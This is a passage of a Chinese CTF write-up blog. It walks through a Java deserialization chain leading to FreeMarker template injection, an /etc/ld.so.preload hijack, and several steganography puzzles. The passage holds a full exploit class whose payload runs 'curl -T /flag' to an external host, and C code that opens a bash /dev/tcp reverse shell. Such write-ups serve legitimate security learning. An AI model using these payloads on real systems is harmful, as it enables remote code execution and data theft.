+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to YCB&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/templating&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">templating</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String name, Model model)</span> &#123;<br>        model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>, name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/getflag&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getflag</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String data)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(data);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        byteArrayOutputStream.write(decode);<br>        <span class="hljs-type">NewObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里需要关注<code>/getflag</code>路由，存在java反序列化漏洞，我们可以利用<code>Utils</code>中的类来实现rce</p>
+<p>首先看<code>HtmlInvocationHandler</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> Map obj;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HtmlInvocationHandler</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HtmlInvocationHandler</span><span class="hljs-params">(Map obj)</span> &#123;<br>        <span class="hljs-built_in">this</span>.obj = obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.obj.get(method.getName());<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里<code>HtmlInvocationHandler</code>实现了<code>InvocationHandler</code>接口，实现了<code>invoke()</code>方法，这里可以实现<strong>动态代理</strong>，如果代理对象调用了任何方法，就会调用<code>HtmlInvocationHandler</code>对象的<code>obj.get()</code>方法，我们看看哪里会有一个get方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlMap</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> String filename;<br>    <span class="hljs-keyword">public</span> String content;<br>    <br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> HtmlUploadUtil.uploadfile(<span class="hljs-built_in">this</span>.filename, <span class="hljs-built_in">this</span>.content);<br>                <span class="hljs-keyword">return</span> obj;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var4) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var4);<br>            &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>HtmlMap</code>类存在get方法，他会调用<code>HtmlUploadUtil.uploadfile()</code>进行文件上传</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlUploadUtil</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HtmlUploadUtil</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">uploadfile</span><span class="hljs-params">(String filename, String content)</span> &#123;<br>        <span class="hljs-keyword">if</span> (filename != <span class="hljs-literal">null</span> &amp;&amp; !filename.endsWith(<span class="hljs-string">&quot;.ftl&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">realPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/app/templates/&quot;</span> + filename;<br>            <span class="hljs-keyword">if</span> (!realPath.contains(<span class="hljs-string">&quot;../&quot;</span>) &amp;&amp; !realPath.contains(<span class="hljs-string">&quot;..\\&quot;</span>)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(realPath));<br>                    writer.write(content);<br>                    writer.close();<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var4) &#123;<br>                    System.err.println(<span class="hljs-string">&quot;Error uploading file: &quot;</span> + var4.getMessage());<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>上传的文件名必须以<code>ftl</code>结尾</p>
+<blockquote>
+<p>freemarker的文件一般以后缀ftl，FreeMarker是一个<strong>模版引擎</strong>，一个基于文本的模板输出工具（生成任意的HTML表单代码）</p>
+</blockquote>
+<p>java中有一个<code>FreeMarker模板注入</code>，我们可以找到poc：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">&lt;#<span class="hljs-keyword">assign</span> test=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?new()&gt; <span class="hljs-symbol">$</span>&#123;test(<span class="hljs-string">&quot;open /Applications/Calculator.app&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以我们只需要上传一个<code>ftl</code>文件，内容为poc即可，使模板渲染恶意文件中的恶意代码执行命令。</p>
+<p>但是我们应该想想怎么才能触发反序列化利用链：</p>
+<p>假设我们可以通过一个类的<code>readObject()</code>方法触发该对象的成员的一个方法，并且这个对象就是<code>HtmlInvocationHandler</code>代理对象，这样任意调用方法就会进入到<code>invoke()</code>方法，调用<code>obj.get()</code>，我们赋值<code>obj</code>为<code>HtmlMap</code>对象，这样就可以上传恶意<code>ftl</code>文件rce了</p>
+<p>那么这里类可以是什么呢？</p>
+<p>这里我学习到了一个新的类：<code>BadAttributeValueExpException</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadAttributeValueExpException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span>   &#123;<br>    <span class="hljs-keyword">private</span> Object val;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> &#123;<br>        <span class="hljs-built_in">this</span>.val = val == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : val.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ...<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>                ...<br>            val = valObj.toString();<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果设置该类的成员变量<code>val</code>为动态代理类<code>HtmlInvocationHandler</code>，那么反序列化就会调用<code>valObj.toString()</code>，从而触发<code>invoke()</code></p>
+<p>因此，poc如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HtmlMap</span> <span class="hljs-variable">htmlMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlMap</span>();<br>        htmlMap.filename = <span class="hljs-string">&quot;index.ftl&quot;</span>;<br>        htmlMap.content = <span class="hljs-string">&quot;&lt;!DOCTYPE html&gt;&lt;html lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;meta charset=\&quot;UTF-8\&quot;&gt;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;curl -T /flag http://ip:9023\&quot;)&#125;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>;<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.ycbjava.Utils.HtmlInvocationHandler&quot;</span>);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">firstConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br><br>        firstConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">root012map</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(<br>                EXP.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,<br>                (InvocationHandler) firstConstructor.newInstance(htmlMap)<br>        );<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">htmlInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)<br>                firstConstructor.newInstance(root012map);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> exception.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br><br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br><br>        valfield.set(exception, root012map);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br><br>        objectOutputStream.writeObject(exception);<br><br>        byteArrayOutputStream.flush();<br><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br><br>        System.out.println(encode);<br><br>        <span class="hljs-type">NewObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewObjectInputStream</span>(<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h4><p>复现这一题学到了新的东西<code>/etc/ld.so.preload</code>命令劫持</p>
+<p>这个东西和<code>php disable function bypass</code>中利用<code>LD_PRELOAD</code>是一样的原理，执行前都会优先加载</p>
+<p>题目有三个功能：&#x2F;cmd.php 可以执行有限的命令，&#x2F;upload.php 可以上传文件，&#x2F;list.php 可以查看特定目录下的文件列表</p>
+<h5 id="etc-ld-so-preload"><a href="#etc-ld-so-preload" class="headerlink" title="&#x2F;etc&#x2F;ld.so.preload"></a>&#x2F;etc&#x2F;ld.so.preload</h5><blockquote>
+<p>通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。</p>
+<p><strong>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和 *默认配置文件<code>/etc/ld.so.preload</code>* ，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和<code>/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</strong></p>
+</blockquote>
+<h5 id="whoami-命令劫持"><a href="#whoami-命令劫持" class="headerlink" title="whoami 命令劫持"></a>whoami 命令劫持</h5><blockquote>
+<p>fuzz 时发现&#x2F;etc 下的文件不给看，猜测&#x2F;etc 为上传目录，同时发现上传文件里留了一个 so 后缀可以通过，结合&#x2F;cmd.php 可以执行命令 whoami，所以应该是要通过<strong>上传恶意 so 文件进行系统命令劫持</strong></p>
+</blockquote>
+<p>上传两个文件</p>
+<p>恶意 so 文件 1.so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack you!!!&quot;</span>);<br>  system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>ld.so.preload</code> 文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span><span class="hljs-number">1</span>.so<br></code></pre></td></tr></table></figure>
+
+<p>然后在&#x2F;cmd.php 执行 whoami 即可劫持</p>
+<p>因为执行命令前，会加载 <code>/etc/ld.so.preload</code> 配置文件来加载动态链接库，文件内容为<code>/etc/1.so</code>。</p>
+<p>由于 <code>whoami</code> 底层会调用 <code>puts</code> 函数输出，所以在<code>1.so</code>中劫持了这个函数造成反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://xp0int.top/posts/2023/09/03/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WriteUp-By-Xp0int/#ez_web">https://xp0int.top/posts/2023/09/03/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WriteUp-By-Xp0int/#ez_web</a></p>
+<p><a target="_blank" rel="noopener" href="https://pankas.top/2022/12/12/rctf-web/#filechecker-pro-max">https://pankas.top/2022/12/12/rctf-web/#filechecker-pro-max</a></p>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h4><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031151972.png" srcset="/img/loading.gif" lazyload alt="image-20230903115104922"></p>
+<p>拿到这么一张图片，首先修改宽高</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031152911.png" srcset="/img/loading.gif" lazyload alt="image-20230903115220853"></p>
+<p>然后这个题是之前win截图的cve漏洞</p>
+<blockquote>
+<p>微软Windows 10、Windows 11 作业系统日前传出，存有一项与截图编辑工具有关的资安漏洞，被称为「aCropalypse」，漏洞编号代码为「CVE-2023-28303 ，被评估为「低严重性」风险。</p>
+</blockquote>
+<p>使用工具：<a target="_blank" rel="noopener" href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031156585.png" srcset="/img/loading.gif" lazyload alt="image-20230903115633350"></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031156213.png" srcset="/img/loading.gif" lazyload alt="image-20230903115658965"></p>
+<h4 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h4><p>拿到一个flag.img镜像文件</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031201617.png" srcset="/img/loading.gif" lazyload alt="image-20230903120126534"></p>
+<p>用7z取出了三个文件</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031201604.png" srcset="/img/loading.gif" lazyload alt="image-20230903120150534"></p>
+<p>提示盲水印</p>
+<p>rar中藏了jpg图片（之前附件有问题，居然没有。）</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031212429.png" srcset="/img/loading.gif" lazyload alt="image-20230903121221350"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">python <span class="hljs-keyword">bwm.py </span>decode cat.<span class="hljs-keyword">jpg </span>not_real_cat.<span class="hljs-keyword">jpg </span>flag.<span class="hljs-keyword">jpg</span><br></code></pre></td></tr></table></figure>
+
+<p>盲水印解出：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031217291.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><code>watermark_is_fun</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031219495.png" srcset="/img/loading.gif" lazyload alt="image-20230903121901355"></p>
+<p>使用<code>VeraCrypt</code>挂载</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031219094.png" srcset="/img/loading.gif" lazyload alt="image-20230903121936019"></p>
+<p>0宽解密</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031220423.png" srcset="/img/loading.gif" lazyload alt="image-20230903122002316"></p>
+<p>base32</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031220832.png" srcset="/img/loading.gif" lazyload alt="image-20230903122054726"></p>
+<p>维吉尼亚解密</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031222548.png" srcset="/img/loading.gif" lazyload alt="image-20230903122215433"></p>
+<h4 id="ai和nia的交响曲"><a href="#ai和nia的交响曲" class="headerlink" title="ai和nia的交响曲"></a>ai和nia的交响曲</h4><p>pcapng流量包中分析出两个文件：</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031331145.png" srcset="/img/loading.gif" lazyload alt="image-20230903133123981" style="zoom:50%;" />
+
+<p>flag1.png</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031332031.png" srcset="/img/loading.gif" lazyload alt="flag1"></p>
+<p>flag2.zip</p>
+<p>是个伪加密</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031332775.png" srcset="/img/loading.gif" lazyload alt="image-20230903133242684"></p>
+<p>0宽解密一下：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031333873.png" srcset="/img/loading.gif" lazyload alt="image-20230903133339814"></p>
+<p>我们只能继续分析flag1了，一大串黑白的图片，只能先把像素提取出来了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag1.png&#x27;</span>)<br>pix = im.load()<br>width = im.size[<span class="hljs-number">0</span>]<br>height = im.size[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        r, g, b = pix[x, y]<br>        <span class="hljs-built_in">print</span>(r, g, b)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031335670.png" srcset="/img/loading.gif" lazyload alt="image-20230903133523622"></p>
+<p>发现这些像素并不是全黑全白的，我们做一个判断，然后转为二进制：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag1.png&#x27;</span>)<br>pix = im.load()<br>width = im.size[<span class="hljs-number">0</span>]<br>height = im.size[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        r, g, b = pix[x, y]<br>        <span class="hljs-keyword">if</span> r &gt; <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-number">0</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>二进制解密</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031337687.png" srcset="/img/loading.gif" lazyload alt="image-20230903133714594"></p>
+<p><code>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</code></p>
+<p>发现bv号，然后找到一个视频：</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031337113.png" srcset="/img/loading.gif" lazyload alt="image-20230903133749017" style="zoom:50%;" />
+
+<p>对照flag2可以获得剩下的flag</p>
+<h4 id="Easy-VMDK"><a href="#Easy-VMDK" class="headerlink" title="Easy_VMDK"></a>Easy_VMDK</h4><blockquote>
